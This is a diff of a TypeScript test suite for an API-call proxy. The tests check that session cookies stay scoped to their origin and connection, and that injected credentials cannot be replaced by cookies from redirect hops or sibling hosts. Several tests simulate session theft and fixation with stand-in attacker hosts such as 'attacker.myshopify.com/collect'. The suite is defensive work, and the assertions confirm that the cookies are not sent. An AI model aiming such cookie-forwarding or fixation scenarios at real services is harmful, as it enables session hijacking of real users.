@@ -1781,9 +2249,9 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     expect(cookiesSeen[1] ?? "").not.toContain("PROVIDER-SESSION");
     // The cookie is still held for its own origin — this is scoping, not a
     // disabled jar.
-    expect(
-      deps.cookieJar.get(cookieBucketKey("kijiji", "open", "https://provider.example.com")),
-    ).toEqual(["sess=PROVIDER-SESSION"]);
+    expect(jarCookies(deps, "kijiji", "https://provider.example.com/")).toBe(
+      "sess=PROVIDER-SESSION",
+    );
   });
 
   it("still replays it on the same origin (sticky sessions keep working)", async () => {
@@ -1797,6 +2265,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
       await executeApiCall(
         {
           integrationId: "kijiji",
+          connectionId: "conn-1",
           targetUrl: target,
           method: "GET",
           callerHeaders: {},
@@ -1815,6 +2284,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     await executeApiCall(
       {
         integrationId: "kijiji",
+        connectionId: "conn-1",
         targetUrl: "https://provider.example.com/login",
         method: "GET",
         callerHeaders: {},
@@ -1825,6 +2295,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     await executeApiCall(
       {
         integrationId: "kijiji",
+        connectionId: "conn-1",
         targetUrl: "https://provider.example.com:8443/inbox",
         method: "GET",
         callerHeaders: {},
@@ -1847,11 +2318,16 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
       credentialFieldName: "access_token",
     }));
     const { cookiesSeen, fetchFn } = recordingFetch("sess=DROPBOX");
-    const deps = makeDeps({ fetchFn, fetchCredentials: dropboxCreds });
+    const deps = makeDeps({
+      fetchFn,
+      declaredUris: ["https://api.dropboxapi.com/**", "https://content.dropboxapi.com/**"],
+      fetchCredentials: dropboxCreds,
+    });
 
     await executeApiCall(
       {
         integrationId: "dropbox",
+        connectionId: "conn-1",
         targetUrl: "https://api.dropboxapi.com/2/files/list",
         method: "GET",
         callerHeaders: {},
@@ -1862,6 +2338,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     await executeApiCall(
       {
         integrationId: "dropbox",
+        connectionId: "conn-1",
         targetUrl: "https://content.dropboxapi.com/2/files/download",
         method: "GET",
         callerHeaders: {},
@@ -1893,6 +2370,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     await executeApiCall(
       {
         integrationId: "shopify",
+        connectionId: "conn-1",
         targetUrl: "https://victim.myshopify.com/admin",
         method: "GET",
         callerHeaders: {},
@@ -1903,6 +2381,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     await executeApiCall(
       {
         integrationId: "shopify",
+        connectionId: "conn-1",
         targetUrl: "https://attacker.myshopify.com/collect",
         method: "GET",
         callerHeaders: {},
@@ -1912,9 +2391,9 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     );
     expect(cookiesSeen[1] ?? "").not.toContain("VICTIM-SESSION");
     // Still sticky for the origin that captured it.
-    expect(
-      deps.cookieJar.get(cookieBucketKey("shopify", "open", "https://victim.myshopify.com")),
-    ).toEqual(["sess=VICTIM-SESSION"]);
+    expect(jarCookies(deps, "shopify", "https://victim.myshopify.com/")).toBe(
+      "sess=VICTIM-SESSION",
+    );
   });
 
   it("does not replay a cookie across hosts under a `https://**` allowlist", async () => {
@@ -1934,6 +2413,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     await executeApiCall(
       {
         integrationId: "anyhost",
+        connectionId: "conn-1",
         targetUrl: "https://provider.example.com/login",
         method: "GET",
         callerHeaders: {},
@@ -1944,6 +2424,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     await executeApiCall(
       {
         integrationId: "anyhost",
+        connectionId: "conn-1",
         targetUrl: "https://attacker.example.net/collect",
         method: "GET",
         callerHeaders: {},
@@ -1973,6 +2454,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     await executeApiCall(
       {
         integrationId: "hybrid",
+        connectionId: "conn-1",
         targetUrl: "https://elsewhere.example.net/x",
         method: "GET",
         callerHeaders: {},
@@ -1984,6 +2466,7 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
     await executeApiCall(
       {
         integrationId: "hybrid",
+        connectionId: "conn-1",
         targetUrl: "https://api.example.com/x?pin={{pin}}",
         method: "GET",
         callerHeaders: {},
@@ -1992,5 +2475,225 @@ describe("executeApiCall — cookie jar is scoped to the capture origin", () => 
       deps,
     );
     expect(cookiesSeen[1] ?? "").not.toContain("FROM-OPEN-CALL");
+  });
+});
+
+describe("executeApiCall — injected Cookie credential meets the jar (#1613)", () => {
+  /** A session integration delivering its credential as a `Cookie` header. */
+  function sessionCreds(authorizedUris: string[] | null, allowAllUris = false) {
+    return mock(async (): Promise<CredentialsResponse> => ({
+      credentials: { session: "injected" },
+      authorizedUris,
+      allowAllUris,
+      credentialHeaderName: "Cookie",
+      credentialHeaderPrefix: "PHPSESSID=",
+      credentialFieldName: "session",
+    }));
+  }
+  const apiCreds = sessionCreds(["https://api.example.com/**"]);
+
+  /**
+   * Answers each request with `setCookie(url, n)` (n = request index) and
+   * records every `Cookie` header sent, per request.
+   */
+  function scriptedFetch(setCookie: (url: string, n: number) => string | undefined) {
+    const sent: string[][] = [];
+    const fetchFn = mock(async (url: string | URL, init?: RequestInit) => {
+      const headers = init?.headers ?? {};
+      sent.push(
+        (headers instanceof Headers ? [...headers] : Object.entries(headers))
+          .filter(([k]) => k.toLowerCase() === "cookie")
+          .flatMap(([, v]) => v),
+      );
+      const u = String(url);
+      if (u.endsWith("/go")) {
+        return new Response(null, {
+          status: 302,
+          headers: { location: "https://attacker.myshop.example/set" },
+        });
+      }
+      if (u.endsWith("/logout")) {
+        return new Response(null, {
+          status: 302,
+          headers: { location: PAGE, "set-cookie": "PHPSESSID=; Max-Age=0" },
+        });
+      }
+      const value = setCookie(u, sent.length - 1);
+      return new Response("{}", { status: 200, headers: value ? { "Set-Cookie": value } : {} });
+    });
+    return { sent, fetchFn: fetchFn as unknown as typeof fetch };
+  }
+  const byCall =
+    (...values: (string | undefined)[]) =>
+    (_url: string, n: number) =>
+      values[n];
+
+  const buffered = (): ApiCallRequestBody => ({ kind: "none" });
+  const streaming = (): ApiCallRequestBody => ({
+    kind: "streaming",
+    stream: new ReadableStream({
+      start(c) {
+        c.enqueue(new Uint8Array([1]));
+        c.close();
+      },
+    }),
+  });
+  async function callEach(
+    deps: ApiCallDeps,
+    targets: string[],
+    body: () => ApiCallRequestBody = buffered,
+  ) {
+    for (const targetUrl of targets) {
+      await executeApiCall(
+        {
+          integrationId: "shop",
+          connectionId: "conn-1",
+          targetUrl,
+          method: "POST",
+          callerHeaders: {},
+          body: body(),
+        },
+        deps,
+      );
+    }
+  }
+  const PAGE = "https://api.example.com/page";
+
+  it.each([
+    ["buffered", buffered],
+    ["streaming", streaming],
+  ])("replays a rotated session once, without a duplicate name (%s)", async (_kind, body) => {
+    const { sent, fetchFn } = scriptedFetch(byCall("PHPSESSID=rotated; HttpOnly"));
+    const deps = makeDeps({ fetchFn, fetchCredentials: apiCreds });
+    await callEach(deps, [PAGE, PAGE], body);
+
+    expect(sent[1]).toEqual(["PHPSESSID=rotated"]);
+  });
+
+  it("falls back to the injected session once upstream deletes it", async () => {
+    const { sent, fetchFn } = scriptedFetch(
+      byCall("PHPSESSID=rotated", "PHPSESSID=; Max-Age=0; Path=/"),
+    );
+    const deps = makeDeps({ fetchFn, fetchCredentials: apiCreds });
+    await callEach(deps, [PAGE, PAGE, PAGE]);
+
+    expect(sent[1]).toEqual(["PHPSESSID=rotated"]);
+    expect(sent[2]).toEqual(["PHPSESSID=injected"]);
+    expect(deps.cookieJar.size).toBe(0);
+  });
+
+  it("falls back to the injected session on the hop after a mid-chain deletion", async () => {
+    const { sent, fetchFn } = scriptedFetch(byCall("PHPSESSID=rotated"));
+    const deps = makeDeps({ fetchFn, fetchCredentials: apiCreds });
+    await callEach(deps, [PAGE, "https://api.example.com/logout"]);
+
+    expect(sent.slice(1)).toEqual([["PHPSESSID=rotated"], ["PHPSESSID=injected"]]);
+  });
+
+  it.each([
+    ["allow_all_uris", sessionCreds(null, true)],
+    ["a glob allowlist", sessionCreds(["https://*.myshop.example/**"])],
+  ])(
+    "a redirect hop's cookie cannot replace the session of the initial origin (%s)",
+    async (_label, fetchCredentials) => {
+      // victim/go → 302 → attacker/set, which plants its own PHPSESSID.
+      const { sent, fetchFn } = scriptedFetch((url) =>
+        url.endsWith("/set") ? "PHPSESSID=attacker; Path=/" : undefined,
+      );
+      const deps = makeDeps({ fetchFn, fetchCredentials });
+      await callEach(deps, [
+        "https://victim.myshop.example/go",
+        "https://victim.myshop.example/account",
+      ]);
+
+      expect(sent.at(-1)).toEqual(["PHPSESSID=injected"]);
+      expect(jarCookies(deps, "shop", "https://attacker.myshop.example/")).toBe(
+        "PHPSESSID=attacker",
+      );
+    },
+  );
+
+  it("a literal sibling host's cookie of the same name does not override the session", async () => {
+    const { sent, fetchFn } = scriptedFetch((url, n) =>
+      url.startsWith("https://static.")
+        ? "PHPSESSID=anon; Path=/"
+        : n === 2
+          ? "PHPSESSID=rotated"
+          : undefined,
+    );
+    const deps = makeDeps({
+      fetchFn,
+      fetchCredentials: sessionCreds([
+        "https://www.shop.example/**",
+        "https://static.shop.example/**",
+      ]),
+    });
+    await callEach(deps, [
+      "https://static.shop.example/img",
+      "https://www.shop.example/cart",
+      "https://www.shop.example/cart",
+      "https://www.shop.example/cart",
+    ]);
+
+    expect(sent[1]).toEqual(["PHPSESSID=injected"]);
+    // An own-origin rotation still wins over the injected session.
+    expect(sent[3]).toEqual(["PHPSESSID=rotated"]);
+  });
+});
+
+describe("executeApiCall — two connections of one integration", () => {
+  // Per-connection tool deps share the run-wide jar and 401 set, exactly as
+  // `integrations-boot.ts` layers one credential pair per connection on them.
+  function sharedRunDeps(fetchFn: typeof fetch) {
+    const shared = {
+      cookieJar: new Map<string, string[]>(),
+      reportedAuthFailures: new Set<string>(),
+    };
+    const refreshA = mock(async () => null);
+    const refreshB = mock(async () => null);
+    return {
+      depsA: makeDeps({ ...shared, fetchFn, refreshCredentials: refreshA }),
+      depsB: makeDeps({ ...shared, fetchFn, refreshCredentials: refreshB }),
+      refreshA,
+      refreshB,
+    };
+  }
+  const call = (connectionId: string) => ({
+    integrationId: "portal",
+    connectionId,
+    targetUrl: "https://api.example.com/x",
+    method: "GET",
+    callerHeaders: {},
+    body: { kind: "none" } as const,
+  });
+
+  it("never replays connection A's session cookie on connection B", async () => {
+    const cookiesSeen: (string | null)[] = [];
+    const fetchFn = mock(async (_url: string | URL, init?: RequestInit) => {
+      cookiesSeen.push(new Headers(init?.headers).get("cookie"));
+      return new Response("ok", {
+        status: 200,
+        headers: cookiesSeen.length === 1 ? { "Set-Cookie": "sess=a-session; Path=/" } : {},
+      });
+    });
+    const { depsA, depsB } = sharedRunDeps(fetchFn as unknown as typeof fetch);
+    await executeApiCall(call("conn-a"), depsA);
+    await executeApiCall(call("conn-b"), depsB);
+    await executeApiCall(call("conn-a"), depsA);
+    expect(cookiesSeen[1]).toBeNull();
+    // CONTROL — the session is still sticky on the connection that earned it.
+    expect(cookiesSeen[2]).toBe("sess=a-session");
+  });
+
+  it("does not let connection A's persistent 401 skip connection B's refresh", async () => {
+    const fetchFn = mock(async () => new Response("expired", { status: 401 }));
+    const { depsA, depsB, refreshA, refreshB } = sharedRunDeps(fetchFn as unknown as typeof fetch);
+    await executeApiCall(call("conn-a"), depsA);
+    expect(refreshA).toHaveBeenCalledTimes(1);
+    await executeApiCall(call("conn-b"), depsB);
+    expect(refreshB).toHaveBeenCalledTimes(1);
+    // CONTROL — A itself is not refreshed a second time.
+    await executeApiCall(call("conn-a"), depsA);
+    expect(refreshA).toHaveBeenCalledTimes(1);
   });
 });
